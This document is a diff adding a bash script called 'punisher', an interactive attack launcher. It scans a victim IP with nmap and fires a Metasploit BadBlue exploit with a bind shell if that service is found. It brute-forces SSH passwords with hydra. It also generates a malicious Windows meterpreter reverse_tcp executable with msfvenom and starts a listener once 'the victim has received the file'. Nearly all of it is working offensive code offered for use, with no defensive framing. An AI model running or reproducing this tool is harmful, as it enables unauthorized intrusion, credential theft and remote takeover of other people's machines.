@@ -1,0 +1,104 @@
+#!/bin/bash
+
+cat style
+echo " " 
+echo "Created by @hippi3c0w"
+echo "Last update: 9/2/2019"
+
+function usage(){
+echo " " 
+echo "help 			-			Shows all available commands"
+echo "nmap			-			Starts nmap attack against IP specified"
+echo "micro			-			Executes an attack using windows reverse_tcp with a malicious file"
+}
+#Color variables
+BLACK='\033[0;30m'
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+ORANGE='\033[0;33m'
+PURPLE='\033[0;34m'
+CYAN='\033[0;35m'
+LIGHTGRAY='\033[0;36m'
+NC='\033[0m'
+DARKGRAY='\033[1;30m'
+LIGHTRED='\033[1;31m'
+LIGHTGREEN='\033[1;32m'
+LIGHTORANGE='\033[1;33m'
+LIGHTPURPLE='\033[1;34m'
+LIGHTCYAN='\033[1;35m'
+op=""
+
+while [[ $op != "exit" ]]
+do
+
+read -p "punisher> " op
+
+if [[ $op == "help" ]]; then
+usage
+fi
+
+if [[ $op == "nmap" ]]; then
+read -p "punisher:Enter Victim IP> " punisher
+echo -e "[${GREEN}+${NC}] Running Open ports scanner. Please wait"
+nmap -sV -Pn $punisher> openPorts.txt
+echo -e "[${GREEN}+${NC}] Open ports scanner is completed"
+fi
+
+#searching for badblue module
+
+badblue=`cat openPorts.txt | grep -i badblue |wc -l`
+
+if [[ $badblue -gt 1 ]];then
+
+echo use exploit/windows/http/badblue_passthru >> metasploit.rc
+echo "set RHOST $punisher" >> metasploit.rc
+echo "set PAYLOAD windows/meterpreter/bind_tcp" >> metasploit.rc 
+echo "exploit" >> metasploit.rc
+msfconsole -r metasploit.rc
+fi
+
+#ssh attack
+sshAttack=`cat openPorts.txt | grep -i ssh | wc -l`
+if [[ $sshAttack -gt 1 ]]; then
+
+echo -e "[${GREEN}+${NC}] Starting SSH password attack "
+read -p "punisher:Enter username or username file> " username
+read -p "punisher:Enter password or password file> " password
+echo $username >> $username.txt
+echo $password >> $password.txt
+hydra -L $username.txt -P $password.txt $punisher -t 8 ssh 
+
+fi
+
+#micro attack 
+
+if [[ $op == "micro" ]]; then
+
+read -p "punisher:Enter a name for malicious exe file with .exe>" file
+myIp=`ip a | grep "inet " | tail -1 | cut -d " " -f6 | cut -d "/" -f1`
+mkdir -p /root/Escritorio/payloads
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$myIp LPORT=8080 -f exe > /root/Escritorio/payloads/$file
+read -p "punisher:has the victim received the file?> " yon
+
+#waiting for the reception of the file
+	if [[ $yon == "y" ]]; then
+		echo "use exploit/multi/handler" >> meterpreter.rc
+		echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> meterpreter.rc
+		#echo "LHOST $myIp" >> meterpreter.rc
+		#echo "LPORT 8080" >> meterpreter.rc
+		#echo "exploit" >> meterpreter.rc
+		msfconsole -r meterpreter.rc
+
+	else
+
+		read -p "punisher:Type y when victim receives the file> " y
+		echo "use exploit/multi/handler" >> meterpreter.rc
+                echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> meterpreter.rc
+                #echo "LHOST $myIp" >> meterpreter.rc
+                #echo "LPORT 8080" >> meterpreter.rc
+                #echo "exploit" >> meterpreter.rc 
+                msfconsole -r meterpreter.rc  
+	fi
+
+fi
+done
